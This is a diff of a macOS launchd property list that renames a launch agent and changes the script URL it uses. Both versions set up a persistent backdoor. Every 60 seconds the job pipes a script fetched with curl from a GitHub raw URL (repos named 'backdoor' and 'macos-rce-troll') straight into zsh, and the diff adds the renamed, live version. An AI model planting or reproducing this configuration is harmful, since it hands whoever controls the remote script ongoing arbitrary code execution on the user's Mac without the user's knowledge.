@@ -3,12 +3,12 @@
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.wolfoverflow.CodeExecutor</string>
+    <string>com.bowie.macosrcetroll</string>
     <key>ProgramArguments</key>
     <array>
         <string>/bin/bash</string>
         <string>-c</string>
-        <string>curl -S "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/script" | zsh</string>
+        <string>curl -S "https://raw.githubusercontent.com/bowie-dev/macos-rce-troll/main/script" | zsh</string>
     </array>
     <key>StartInterval</key>
     <integer>60</integer>
